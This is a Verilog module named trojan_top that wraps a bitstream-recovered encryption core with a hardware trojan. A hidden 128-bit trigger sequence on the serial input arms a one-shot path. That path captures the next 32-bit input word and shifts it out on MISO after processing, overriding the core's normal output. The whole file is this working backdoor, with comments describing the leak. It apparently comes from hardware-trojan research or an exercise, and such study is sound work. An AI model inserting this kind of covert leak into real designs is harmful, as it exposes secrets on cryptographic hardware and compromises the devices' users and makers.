`default_nettype none

// Wrapper around the bitstream-derived gate-level netlist. An exact hidden
// serial command arms a one-shot MISO path that returns the next input word.
module trojan_top (
    input  wire SCK,
    input  wire RST_N,
    input  wire MOSI,
    output wire MISO,
    input  wire NORM_CS_N,
    input  wire START,
    input  wire ENCRYPT_NDECRYPT,
    output wire BUSY,
    output wire ICE_LED,
    input  wire SCAN_CS_N
);
    wire core_miso;
    wire core_busy;
    wire core_led;

    recovered_core u_recovered (
        .SCK(SCK),
        .ENCRYPT_NDECRYPT(ENCRYPT_NDECRYPT),
        .NORM_CS_N(NORM_CS_N),
        .MOSI(MOSI),
        .RST_N(RST_N),
        .START(START),
        .ICE_LED(core_led),
        .BUSY(core_busy),
        .MISO(core_miso),
        .SCAN_CS_N(SCAN_CS_N)
    );

    assign BUSY = core_busy;
    assign ICE_LED = core_led;

    // Concatenation is the four marker frames in MSB-first wire order.
    localparam [127:0] TRIGGER_STREAM = {
        32'hC6A5923D, 32'h4D33E10B, 32'h97F02CA5, 32'h6B8E5412
    };

    reg [31:0] leak_word;
    reg [5:0] frame_bits;
    reg [7:0] trigger_pos;
    reg armed;
    reg payload_pending;
    reg processing_seen;
    reg leak_active;
    reg leak_miso;

    assign MISO = leak_active ? leak_miso : core_miso;

    always @(posedge SCK) begin
        if (!RST_N) begin
            leak_word <= 32'b0;
            frame_bits <= 0;
            trigger_pos <= 0;
            armed <= 1'b0;
            payload_pending <= 1'b0;
            processing_seen <= 1'b0;
            leak_active <= 1'b0;
            leak_miso <= 1'b0;
        end else begin
            if (!NORM_CS_N) begin
                if (frame_bits < 33)
                    frame_bits <= frame_bits + 1'b1;

                // Reuse the payload register as the serial input capture only
                // after arming; it later shifts those same bits out on MISO.
                if (armed && !core_busy && !ENCRYPT_NDECRYPT) begin
                    leak_word <= {leak_word[30:0], MOSI};
                    trigger_pos <= 0;
                end else if (!armed && !payload_pending && !core_busy && !ENCRYPT_NDECRYPT) begin
                    if (trigger_pos < 128) begin
                        if (MOSI == TRIGGER_STREAM[127-trigger_pos])
                            trigger_pos <= trigger_pos + 1'b1;
                        else if (MOSI == TRIGGER_STREAM[127])
                            trigger_pos <= 1;
                        else
                            trigger_pos <= 0;
                    end else begin
                        trigger_pos <= 0;
                    end
                end else begin
                    trigger_pos <= 0;
                end

                // Begin disclosure on the first read edge after processing.
                if (payload_pending && processing_seen && !core_busy) begin
                    leak_active <= 1'b1;
                    leak_miso <= leak_word[31];
                    leak_word <= {leak_word[30:0], 1'b0};
                    payload_pending <= 1'b0;
                end else if (leak_active) begin
                    leak_miso <= leak_word[31];
                    leak_word <= {leak_word[30:0], 1'b0};
                end
            end else begin
                if (frame_bits == 32 && !core_busy && !ENCRYPT_NDECRYPT) begin
                    if (armed) begin
                        payload_pending <= 1'b1;
                        processing_seen <= 1'b0;
                        armed <= 1'b0;
                        trigger_pos <= 0;
                    end else if (trigger_pos == 128) begin
                        armed <= 1'b1;
                        trigger_pos <= 0;
                    end else if (trigger_pos[4:0] != 0) begin
                        // A partial command prefix at the frame boundary is invalid.
                        trigger_pos <= 0;
                    end
                end else if (frame_bits != 0) begin
                    // Partial/overlong frames, busy traffic, and decrypt mode
                    // break the command and disarm any pending source capture.
                    trigger_pos <= 0;
                    armed <= 1'b0;
                    payload_pending <= 1'b0;
                end
                frame_bits <= 0;

                if (leak_active)
                    leak_active <= 1'b0;
            end

            if (core_busy)
                processing_seen <= 1'b1;
            if (START && !payload_pending)
                processing_seen <= 1'b0;
        end
    end
endmodule

`default_nettype wire
